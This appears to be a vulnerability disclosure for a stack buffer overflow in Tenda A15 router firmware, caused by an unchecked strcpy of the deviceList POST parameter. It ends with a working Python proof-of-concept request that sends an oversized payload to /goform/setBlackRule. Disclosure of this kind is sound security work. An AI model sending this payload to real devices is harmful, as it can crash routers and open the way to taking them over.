## Firmware information

- Manufacturer's address: https://www.tendacn.com
- Firmware download address: https://www.tendacn.com/download/detail-3187.html

## Affected version

US_A15V1.0RTL_V15.13.07.13_multi_TD01

## Vulnerability details

The Tenda US_A15V1.0RTL_V15.13.07.13_multi_TD01 firmware has a stack overflow vulnerability in the `formAddMacfilterRule` function. The `rule` variable receives the `deviceList` parameter from a POST request. However, since the user can control the input of  `deviceList`, in function `parse_macfilter_rule`, the statement `strcpy(dest_rule->name, source_rule);` can cause a buffer overflow vulnerability. 

![image-20240318013339259](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318013339259.png)

![image-20240318013413556](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318013413556.png)

![image-20240318013601584](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318013601584.png)

![image-20240318013535170](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318013535170.png)

## POC

```python
import requests
ip = '192.168.84.101'
url = f'http://{ip}/goform/setBlackRule'

payload = {
    'deviceList': 'a' * 0x400 + '\r' + 'ff:ff:ff:ff:ff:ff'
    # 'mac': 'a' * 0x1000
}

r = requests.post(url=url, data=payload)

print(r.content)
```

![image-20240318013730640](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318013730640.png)
